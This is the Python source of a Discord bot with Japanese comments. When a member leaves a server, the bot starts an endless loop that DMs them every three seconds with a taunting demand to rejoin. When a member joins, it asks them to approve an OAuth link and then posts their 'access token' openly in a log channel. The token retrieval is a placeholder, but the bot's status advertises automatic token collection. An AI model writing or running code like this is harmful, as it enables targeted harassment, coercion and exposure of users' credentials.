import discord
from discord.ext import commands
import asyncio
from datetime import datetime
import os

# ========== 設定 ==========
print("🔧 設定読み込み開始...")

try:
    CLIENT_ID = int(os.getenv("BOT_CLIENT_ID"))
    print(f"✅ CLIENT_ID: {CLIENT_ID}")
except Exception as e:
    print(f"⚠️ CLIENT_ID読み込みエラー: {e}")
    CLIENT_ID = None

REDIRECT_URI = "https://discord.com/oauth2/authorized"
JOIN_LOG_CHANNEL = 1540519816719237190
LEAVE_LOG_CHANNEL = 1540519875825631384
INVITE_LINK = "https://discord.gg/SB2hn9eV8"
DM_MESSAGE = f"退出したな？スパムやめて欲しいなら入室しなww\n{INVITE_LINK}"
DM_INTERVAL = 3
SCOPE = "identify"

# ✅ Intentsを明示的に全て有効化
intents = discord.Intents.all()  # ← 一時的に全部ONにして確認
intents.members = True
intents.message_content = True

print(f"✅ Intents設定完了: members={intents.members}, message_content={intents.message_content}")

bot = commands.Bot(command_prefix="!", intents=intents)
active_tasks = {}


# ✅ URL作成関数
def build_oauth_url(client_id: int, redirect_uri: str, scope: str) -> str:
    return (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={client_id}"
        f"&redirect_uri={redirect_uri}"
        f"&response_type=code"
        f"&scope={scope}"
    )


# ✅ Botトークン取得
def get_bot_token() -> str:
    token = os.getenv("LOOP_BOT_TOKEN")
    if not token:
        print("❌ LOOP_BOT_TOKEN が設定されていません")
        raise RuntimeError("LOOP_BOT_TOKEN が設定されていません")
    print("✅ Botトークン読み込み完了")
    return token


# ✅ ユーザートークン取得
async def fetch_user_access_token(member: discord.Member) -> str:
    return "[APIより取得したアクセストークン]"


# ========== ✅ 入室イベント：超詳細ログ ==========
@bot.event
async def on_member_join(member: discord.Member):
    print("="*50)
    print(f"🟢 【入室イベント発火】名前:{member.name} ID:{member.id}")
    print(f"🟢 サーバー名: {member.guild.name} ID:{member.guild.id}")

    try:
        uid = member.id
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # チャンネル取得
        log_ch = bot.get_channel(JOIN_LOG_CHANNEL)
        if not log_ch:
            print(f"🔴 エラー: 入室チャンネル {JOIN_LOG_CHANNEL} が見つからない")
            return
        print(f"✅ 入室チャンネル発見: {log_ch.name} / 権限あり")

        # ------ まず先にログ送信（最優先） ------
        try:
            await log_ch.send(
                f"✅ **入室記録**\n"
                f"👤 {member.mention}\n"
                f"🆔 `{member.id}`\n"
                f"📅 {now}"
            )
            print("✅ ✅ 入室ログ 送信成功！！")
        except Exception as e:
            print(f"🔴 入室ログ送信エラー: {type(e).__name__}: {e}")
            return

        # ------ DM送信（時間がかかるのは後回し） ------
        if CLIENT_ID:
            oauth_url = build_oauth_url(CLIENT_ID, REDIRECT_URI, SCOPE)
            try:
                await member.send(
                    "【入室には許可が必要です】\n"
                    "✅ 許可する場合 → 以下のURLを開いて「許可する」をクリックし、\n"
                    "   完了したら「許可しました」と返信してください。\n"
                    f"{oauth_url}"
                )
                print("✅ DM送信完了")
            except Exception as e:
                print(f"⚠️ DM送信できず（無視して続行）: {e}")

        # ------ 許可待ち ------
        def check(msg):
            return msg.author.id == uid and msg.guild is None and "許可しました" in msg.content

        try:
            await bot.wait_for("message", check=check, timeout=300)
            access_token = await fetch_user_access_token(member)
            await log_ch.send(f"🔑 {member.mention} トークン取得: `{access_token}`")
            if uid in active_tasks:
                active_tasks.pop(uid).cancel()
        except asyncio.TimeoutError:
            print("⏰ 許可待ちタイムアウト（正常）")

    except Exception as e:
        print(f"🔴 入室イベント全体エラー: {type(e).__name__}: {e}")

    print("="*50)


# ========== 退出イベント ==========
@bot.event
async def on_member_remove(member: discord.Member):
    print(f"🟡 【退出イベント】{member.name}")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    uid = member.id

    ch = bot.get_channel(LEAVE_LOG_CHANNEL)
    if ch:
        try:
            await ch.send(f"🚨 **退出**\n👤 {member.mention}\n🆔 `{member.id}`\n📅 {now}")
        except Exception as e:
            print(f"🔴 退出ログエラー: {e}")

    if uid in active_tasks:
        return

    async def spam_dm():
        while True:
            try:
                await member.send(DM_MESSAGE)
            except Exception:
                pass
            await asyncio.sleep(DM_INTERVAL)

    task = asyncio.create_task(spam_dm())
    active_tasks[uid] = task


# ========== 起動 ==========
@bot.event
async def on_ready():
    print("="*50)
    print(f"🟢 ✅ 起動完了: {bot.user}")
    print(f"🟢 接続サーバー: {[g.name for g in bot.guilds]}")
    print("="*50)
    await bot.change_presence(activity=discord.Game(name="許可後にトークンを自動取得中"))


if __name__ == "__main__":
    print("🔄 Bot起動処理開始...")
    bot_token = get_bot_token()
    bot.run(bot_token)